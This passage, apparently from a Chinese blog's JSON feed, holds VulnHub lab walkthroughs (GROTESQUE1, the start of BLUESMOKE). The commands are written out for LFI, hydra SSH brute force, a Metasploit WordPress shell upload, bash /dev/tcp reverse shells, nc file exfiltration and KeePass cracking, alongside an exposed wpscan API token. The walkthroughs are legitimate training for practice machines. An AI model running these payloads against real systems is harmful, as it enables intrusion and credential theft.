class=\"markdownIt-Anchor\" href=\"#第二个字典填一个经常用的后缀如下\">#</a> 第二个字典填一个经常用的后缀，如下</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-874.png\" alt></p>\n<p>并且采用 md 5 加密对自己的 payload 进行加密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-875.png\" alt></p>\n<p>注意要对第一个字段 md 5 加密，第二个字段不加密，按此方法爆破即可</p>\n<p>还有另外一种爆破方式，是通过 linux 命令生成批量的 md 5 加密的字典<br>\n for i in <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>c</mi><mi>a</mi><mi>t</mi><mi mathvariant=\"normal\">/</mi><mi>u</mi><mi>s</mi><mi>r</mi><mi mathvariant=\"normal\">/</mi><mi>s</mi><mi>h</mi><mi>a</mi><mi>r</mi><mi>e</mi><mi mathvariant=\"normal\">/</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>s</mi><mi mathvariant=\"normal\">/</mi><mi>d</mi><mi>i</mi><mi>r</mi><mi>b</mi><mi>u</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi mathvariant=\"normal\">/</mi><mi>d</mi><mi>i</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>y</mi><mo>−</mo><mi>l</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo>−</mo><mn>2.3</mn><mo>−</mo><mi>m</mi><mi>e</mi><mi>d</mi><mi>i</mi><mi>u</mi><mi>m</mi><mi mathvariant=\"normal\">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mo stretchy=\"false\">)</mo><mo separator=\"true\">;</mo><mi>d</mi><mi>o</mi><mi>e</mi><mi>c</mi><mi>h</mi><mi>o</mi></mrow><annotation encoding=\"application/x-tex\">(cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt); do echo\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">m</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">t</span><span class=\"mclose\">)</span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">o</span></span></span></span>i;echo $i | md5sum &gt;&gt; dirscroty_md5.txt; done</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-876.png\" alt></p>\n<p>生成的字典显示如下，每一行的最后面都有一个横线，利用 vim 清除横线</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-877.png\" alt></p>\n<p>输入:% s#-##g 即可以批量清除横线</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-878.png\" alt></p>\n<p>此时的字典已经显示为正常，可用此 md 5 加密字典进行爆破</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-879.png\" alt></p>\n<p>用 gobuster 加载此字典进行目录的搜集<br>\n gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w<br>\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium-md5.txt -u<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 63 /</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-880.png\" alt></p>\n<h3 id=\"找到了一个敏感的地址\"><a class=\"markdownIt-Anchor\" href=\"#找到了一个敏感的地址\">#</a> 找到了一个敏感的地址：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjQyL2Y2NmIyMmJmMDIwMzM0YjA0YzdkMGQzZWI1MDEwMzkxLnBocA==\">http://192.168.31.242/f66b22bf020334b04c7d0d3eb5010391.php</span><br>\n 打开这个页面，看能否得到更多的线索</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-881.png\" alt></p>\n<p>看来是有一些参数在这个 url 地址后边</p>\n<h3 id=\"003-wfuzz爆破http参数hydra爆破\"><a class=\"markdownIt-Anchor\" href=\"#003-wfuzz爆破http参数hydra爆破\">#</a> 003 wfuzz 爆破 http 参数，hydra 爆破</h3>\n<p>用 wfuzz 爆破 http 参数<br>\n wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u<br>\n&quot;<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjMvZjY2YjIyYmYwMjAzMzRiMDRjN2QwZDNlYjUwMTAzOTEucGhwP0ZVWlo9L2V0Yy9wYXNzd2Q=\">http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd</span><br>\n&quot; -c --hh 0 -t 32 --hc 404,403</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-882.png\" alt></p>\n<p>找到了一个 pupose 时返回 200 的代码</p>\n<p>打开这个目录后，发现了敏感文件泄漏<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjMvZjY2YjIyYmYwMjAzMzRiMDRjN2QwZDNlYjUwMTAzOTEucGhwP3B1cnBvc2U9L2V0Yy9wYXNzd2Q=\"> http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/etc/passwd</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-883.png\" alt></p>\n<p>检查源代码可以看到格式比较标准的文件，发现存在 freddie 和 root 两个用户</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-884.png\" alt></p>\n<p>目前只能收集到上述一个用户名的信息，密码没有，尝试 hydra 爆破<br>\n由于之前采用的是 md 5 加密的目录才搜索到的网址，这里对正常的字典扫描了<br>\n一遍之后并没有发现，于是猜测用 md 5 加密字典对 ssh 密码扫描<br>\n hydra -l freddie -P g3.txt ssh://192.168.31.63 -f -t 32 -I -o hydra.ssh<br>\n 扫描到用户 freddie 的密码是 61a4e3e60c063d1e472dd780f64e6cad</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-885.png\" alt></p>\n<p>ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmZyZWRkaWVAMTkyLjE2OC4zMS42Mw==\">freddie@192.168.31.63</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-886.png\" alt></p>\n<h3 id=\"004-pspy监控smb共享文件\"><a class=\"markdownIt-Anchor\" href=\"#004-pspy监控smb共享文件\">#</a> 004 pspy 监控，smb 共享文件</h3>\n<p>看到有一个 445 端口正在执行， 445 是 smb 协议，可看看共享文件夹中的内容</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-887.png\" alt></p>\n<p>smbclient -N -L 127.0.0.1<br>\n 其中带 $ 的是管理员才能进入的目录，发现可直接访问的 grotesque 目录</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-888.png\" alt></p>\n<h3 id=\"连接到共享文件夹中没有什么敏感文件\"><a class=\"markdownIt-Anchor\" href=\"#连接到共享文件夹中没有什么敏感文件\">#</a> 连接到共享文件夹中，没有什么敏感文件</h3>\n<p>smbclient \\\\127.0.0.1\\grotesque</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-889.png\" alt></p>\n<p>给服务器下载一个 pyps 64 s 进行监控，看会不会执行 smb 中的文件<br>\n发现每隔一段时间就会执行 smb 中的可执行文件<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbC1mZzFoeWo5aHU2Y3Uwb3dxdnh2aXUwdDB6N20uc2g=\">那么我们就准备一个 shell.sh</span>，尝试上传到 smb 中</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-890.png\" alt></p>\n<p>将 shell.sh 中的内容复制，粘贴到靶机上边<br>\n将靶机上的 shell.sh 中的内容再次上传到 smb 服务中</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-891.png\" alt></p>\n<p>监听 shell，等待反弹，pspy 监控到执行，同时得到了 root 的 shell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-892.png\" alt></p>\n<p>à 拿到了 root 的权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/136%20GROTESQUE1/",
            "title": "VULNHUB 36 GROTESQUE1",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTEwMSw2NTgv\">https://www.vulnhub.com/entry/grotesque-101,658/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BlcnBldHVhbF9CbHVlL2FydGljbGUvZGV0YWlscy8xMjQ1NDE4OTM=\">https://blog.csdn.net/Perpetual_Blue/article/details/124541893</span></p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31. 73<br>\n 靶机 GROTESQUE1：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep ‘a0’ &gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk ‘{print<br>\n$1}’ &gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-950.png\" alt></p>\n<p>à 靶机 ip：192.168.31.29、靶机开放端口 80</p>\n<p>2 ）再次确认开放端口</p>\n<h3 id=\"识别到的-80-端口没有其他的端口感觉是有问题的因为这种情况很少能侵\"><a class=\"markdownIt-Anchor\" href=\"#识别到的-80-端口没有其他的端口感觉是有问题的因为这种情况很少能侵\">#</a> 识别到的 80 端口，没有其他的端口，感觉是有问题的，因为这种情况很少能侵</h3>\n<h3 id=\"入到系统需要再次进行扫描判断结果是否正确\"><a class=\"markdownIt-Anchor\" href=\"#入到系统需要再次进行扫描判断结果是否正确\">#</a> 入到系统，需要再次进行扫描判断结果是否正确</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-951.png\" alt></p>\n<p>à 靶机开放端口 66 、 80</p>\n<h3 id=\"002-信息收集sort使用wordpress测试\"><a class=\"markdownIt-Anchor\" href=\"#002-信息收集sort使用wordpress测试\">#</a> 002 信息收集，sort 使用，wordpress 测试</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 29 / 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-952.png\" alt></p>\n<p>先用 gobuster 进行一波目录扫描<br>\n gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-<br>\nlist-2.3-medium.txt -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 2 9/</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-953.png\" alt></p>\n<h3 id=\"80-端口可以放弃了开始把目标放在-66-端口上\"><a class=\"markdownIt-Anchor\" href=\"#80-端口可以放弃了开始把目标放在-66-端口上\">#</a> 80 端口可以放弃了，开始把目标放在 66 端口上</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 29 : 66 / 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-954.png\" alt></p>\n<h3 id=\"看到有个地址可以直接下载项目地址这里我们直接点击下载\"><a class=\"markdownIt-Anchor\" href=\"#看到有个地址可以直接下载项目地址这里我们直接点击下载\">#</a> 看到有个地址可以直接下载项目地址，这里我们直接点击下载</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-955.png\" alt></p>\n<h3 id=\"这么多文件一眼看去只有几个是-1-18号的文件先对这几个文件测试\"><a class=\"markdownIt-Anchor\" href=\"#这么多文件一眼看去只有几个是-1-18号的文件先对这几个文件测试\">#</a> 这么多文件，一眼看去只有几个是 1 .18 号的文件，先对这几个文件测试</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-956.png\" alt></p>\n<h3 id=\"按日期这一列对这些文件进行排序输入如下命令\"><a class=\"markdownIt-Anchor\" href=\"#按日期这一列对这些文件进行排序输入如下命令\">#</a> 按日期这一列对这些文件进行排序，输入如下命令</h3>\n<p>ls - Alh | sort -k 7</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-957.png\" alt></p>\n<h3 id=\"接下来就依次看看这几个文件\"><a class=\"markdownIt-Anchor\" href=\"#接下来就依次看看这几个文件\">#</a> 接下来就依次看看这几个文件</h3>\n<p>cat assets/* | sort | uniq</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-958.png\" alt></p>\n<h3 id=\"一堆乱码是没有价值的信息\"><a class=\"markdownIt-Anchor\" href=\"#一堆乱码是没有价值的信息\">#</a> 一堆乱码，是没有价值的信息</h3>\n<p>cat <span class=\"exturl\" data-url=\"aHR0cDovL2luZGV4Lm1k\">index.md</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-959.png\" alt></p>\n<h3 id=\"这个文件没有有价值的信息\"><a class=\"markdownIt-Anchor\" href=\"#这个文件没有有价值的信息\">#</a> 这个文件没有有价值的信息</h3>\n<p>cat _vvmlist | sort | uniq</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-960.png\" alt></p>\n<p>在这个文件中找到了一个 wordpress 的站点</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-961.png\" alt></p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjkv\">http://192.168.31.29/</span>lyricsblog 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-962.png\" alt></p>\n<p>直接用 wpscan 工具对 wordpress 站点进行扫描<br>\n wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZy8=\">http://192.168.31.29/lyricsblog/</span> - e</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-963.png\" alt></p>\n<p>得到一个用户名 erdalkomurcu<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-964.png\" alt></p>\n<p>指定用户为 erdalkomurcu 进行密码爆破<br>\n wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZy8=\">http://192.168.31.29/lyricsblog/</span> - U erdalkomurcu -P<br>\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-965.png\" alt></p>\n<h3 id=\"密码爆破了很长时间都没成功可能是一个复杂密码\"><a class=\"markdownIt-Anchor\" href=\"#密码爆破了很长时间都没成功可能是一个复杂密码\">#</a> 密码爆破了很长时间都没成功，可能是一个复杂密码</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-966.png\" alt></p>\n<h3 id=\"从工具出发没有找到那么我们就从常规的目录扫描进行测试\"><a class=\"markdownIt-Anchor\" href=\"#从工具出发没有找到那么我们就从常规的目录扫描进行测试\">#</a> 从工具出发没有找到，那么我们就从常规的目录扫描进行测试</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-967.png\" alt></p>\n<p>一些常规的目录，没有什么特殊的，就是有一个 login 地址</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-968.png\" alt></p>\n<h3 id=\"既然工具和目录扫描都没有发现可疑的信息可以尝试去检查一些源代码看\"><a class=\"markdownIt-Anchor\" href=\"#既然工具和目录扫描都没有发现可疑的信息可以尝试去检查一些源代码看\">#</a> 既然工具和目录扫描都没有发现可疑的信息，可以尝试去检查一些源代码，看</h3>\n<h3 id=\"看靶机作者有没有遗留一些提示给我们\"><a class=\"markdownIt-Anchor\" href=\"#看靶机作者有没有遗留一些提示给我们\">#</a> 看靶机作者有没有遗留一些提示给我们</h3>\n<p>查看 wordpress 首页的源代码 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy8=\">http://192.168.31.19/lyricsblog/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-969.png\" alt></p>\n<h3 id=\"访问这个网址得到一个文件\"><a class=\"markdownIt-Anchor\" href=\"#访问这个网址得到一个文件\">#</a> 访问这个网址，得到一个文件</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 2 9/lyricsblog/yesman.png</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-970.png\" alt></p>\n<h3 id=\"线索到这里就断了这个图片并没有什么利用价值-但是我们可以肯定的是\"><a class=\"markdownIt-Anchor\" href=\"#线索到这里就断了这个图片并没有什么利用价值-但是我们可以肯定的是\">#</a> 线索到这里就断了，这个图片并没有什么利用价值。但是我们可以肯定的是，</h3>\n<p>线索一定是存在在 wordpres 这个站点上的。接下来我们就手动翻一翻网页，看<br>\n上面有没有什么线索。</p>\n<h3 id=\"003-md5sum加密文件awk将文件内容转大写\"><a class=\"markdownIt-Anchor\" href=\"#003-md5sum加密文件awk将文件内容转大写\">#</a> 003 md5sum 加密文件，awk 将文件内容转大写</h3>\n<h3 id=\"观察上边的图片对比在站点上找到的页面发现了一个巧合点\"><a class=\"markdownIt-Anchor\" href=\"#观察上边的图片对比在站点上找到的页面发现了一个巧合点\">#</a> 观察上边的图片，对比在站点上找到的页面，发现了一个巧合点</h3>\n<h3 id=\"此图片顶头有个-yesi-enjoy-hakan-tasiyan\"><a class=\"markdownIt-Anchor\" href=\"#此图片顶头有个-yesi-enjoy-hakan-tasiyan\">#</a> 此图片顶头有个 YES,I ENJOY HAKAN TASIYAN</h3>\n<p>网页上有一段标题为 Hakan Taşıyan – Doktor<br>\n 可能突破点就在于这个点</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-971.png\" alt></p>\n<h3 id=\"进到这个页面之后这里有三段文字\"><a class=\"markdownIt-Anchor\" href=\"#进到这个页面之后这里有三段文字\">#</a> 进到这个页面之后，这里有三段文字</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-972.png\" alt></p>\n<h3 id=\"是不是有联系将不带标题的段落文本复制到文本文件中并保存\"><a class=\"markdownIt-Anchor\" href=\"#是不是有联系将不带标题的段落文本复制到文本文件中并保存\">#</a> 是不是有联系，将不带标题的段落文本复制到文本文件中并保存</h3>\n<h3 id=\"计算并检查-md5-消息摘要\"><a class=\"markdownIt-Anchor\" href=\"#计算并检查-md5-消息摘要\">#</a> 计算并检查 MD5 消息摘要</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-973.png\" alt></p>\n<p>在后台处尝试登陆，用户名为 wpscan 破解出来的，密码就用此 md 5 数据</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-974.png\" alt></p>\n<p>登陆失败，将 md 5 数据由小写变为大写再次尝试<br>\n cat md5.txt | awk ‘{print toupper ($0)}’ &gt;&gt; MD5.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-975.png\" alt></p>\n<p>再次登陆此网址 http://192.168.31.19/lyricsblog/wp-login.php<br>\n 由密码 BC 78 C6AB38E114D 61354 09E 44 F 7 CDDA2 成功进入</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-976.png\" alt></p>\n<h3 id=\"后台页面显示如下\"><a class=\"markdownIt-Anchor\" href=\"#后台页面显示如下\">#</a> 后台页面显示如下</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-977.png\" alt></p>\n<h3 id=\"004-msf攻击wordpressmeterpreter交接shell\"><a class=\"markdownIt-Anchor\" href=\"#004-msf攻击wordpressmeterpreter交接shell\">#</a> 004 msf 攻击 wordpress，meterpreter 交接 shell</h3>\n<p>可以搜索 wordpress 相关版本查看相关漏洞，查看版本之后用 msf 反弹 shell<br>\nuse exploit/unix/webapp/wp_admin_shell_upload<br>\nset password BC78C6AB38E114D6135409E44F7CDDA2<br>\nset rhosts 192.168.31.29<br>\nset username erdalkomurcu<br>\nset targeturi /lyricsblog</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-978.png\" alt></p>\n<p>options 检查如下参数</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-979.png\" alt></p>\n<p>run 开始执行 wordpress 的攻击，成功拿到靶机的 webshell</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-980.png\" alt></p>\n<p>将 msf 的 shell 反弹出来进行美化便于操作<br>\n bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.31.75/4445 0&gt;&amp;1’<br>\nnc -lvvp 4445</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-981.png\" alt></p>\n<h3 id=\"005-config文件提权传输文件总结keepass解密\"><a class=\"markdownIt-Anchor\" href=\"#005-config文件提权传输文件总结keepass解密\">#</a> 005 config 文件提权，传输文件总结，keepass 解密</h3>\n<p>翻阅服务器的相关文件，看到 config 配置文件，找到了数据库用户名和密码<br>\n并且 /etc/passwd 中是用 raphael 这个用户的<br>\n su raphael:<em>double_trouble</em></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-982.png\" alt></p>\n<p>注意到此用户根目录下有一个隐藏文件.chadroot.kdbx<br>\nKeePass 是一款免费的开源密码管理器，可帮助您以安全的方式管理您的密码。<br>\n您可以将所有密码存储在一个数据库中，该数据库由主密钥锁定。因此，您只需<br>\n记住一个主密钥即可解锁整个数据库。数据库文件使用目前已知的最佳和最安全<br>\n的加密算法（AES- 256 、ChaCha20 和 Twofish）进行加密。</p>\n<p>Keepass 存在漏洞，把其传到 kali 机器上，有多种传输方式<br>\n scp -P22 <span class=\"exturl\" data-url=\"bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjcz\">parallels@192.168.31.73</span>:/home/parallels/Desktop/tmp/.chadroot.kdbx.</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-983.png\" alt></p>\n<p>nc 192.168.31.73 4446 &lt; .chadroot.kdbx</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-984.png\" alt></p>\n<p>python3 -m http.server 80 00<br>\nwget 192.168.31.29/.chadroot.kdbx -O 2.kdbx</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-985.png\" alt></p>\n<p>用 keepass2john 将 kdbx 后缀的文件转化为 john 能破解的格式并破解<br>\n keepass2john .chadroot.kdbx &gt; chadroot<br>\njohn --wordlist=/usr/share/wordlists/rockyou.txt chadroot</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-986.png\" alt></p>\n<p>此处破解的密码应该是：chatter</p>\n<p>登陆网站 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHAua2Vld2ViLmluZm8v\">https://app.keeweb.info/</span> 输入 chatter 进入</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-987.png\" alt></p>\n<p>得到如下界面，每一个页面里边都有一个 root 对应的密码，这四个密码分别<br>\n是 .:.yarak.:./sercertservice/.:.subjective.:./rockyou.txt</p>\n<p>在服务器里边分别尝试这四个 root 的密码是否正确</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-988.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-989.png\" alt></p>\n<p>输入密码.:.subjective.:. 时成功拿到 root 权限</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-990.png\" alt></p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/138%20BLUESOMKE/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/138%20BLUESOMKE/",
            "title": "VULNHUB 38 BLUESOMKE",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZXNtb2tlLWRldnJhbmRvbTIsNjc4Lw==\">https://www.vulnhub.com/entry/bluesmoke-devrandom2,678/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly92aXNoYWwtY2hhbmRhay5tZWRpdW0uY29tL3Z1bG5odWItYmx1ZXNtb2tlLQ==\">https://vishal-chandak.medium.com/vulnhub-bluesmoke-</span><br>\ndevrandom2-write-up-a669e7382ba0</p>\n<h3 id=\"001-确认攻击目标的财产信息\"><a class=\"markdownIt-Anchor\" href=\"#001-确认攻击目标的财产信息\">#</a> 001 确认攻击目标的财产信息</h3>\n<p>攻击机 kali： 1 92.168.31. 78<br>\n 靶机 VENUS：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1014.png\" alt></p>\n<p>à 靶机 ip：192.168.31. 84 、靶机开放端口 22 , 80</p>\n<h3 id=\"002-定期执行的tar文件反弹shelltar命令漏洞\"><a class=\"markdownIt-Anchor\" href=\"#002-定期执行的tar文件反弹shelltar命令漏洞\">#</a> 002 定期执行的 tar 文件反弹 shell，tar 命令漏洞</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEu\">http://192.168.31.</span> 84 / 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-1015.png\" alt></p>\n<p>对方服务器回执行我们上传的 tar 文件，通过上传恶意 tar 文件反弹 shell<br>\ncat &gt; <span class=\"exturl\" data-url=\"aHR0cDovL2V4cC5zaA==\">exp.sh</span> &lt;&lt; EOF<br>\n#! /bin/bash<br>\nbash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.31.78/4444 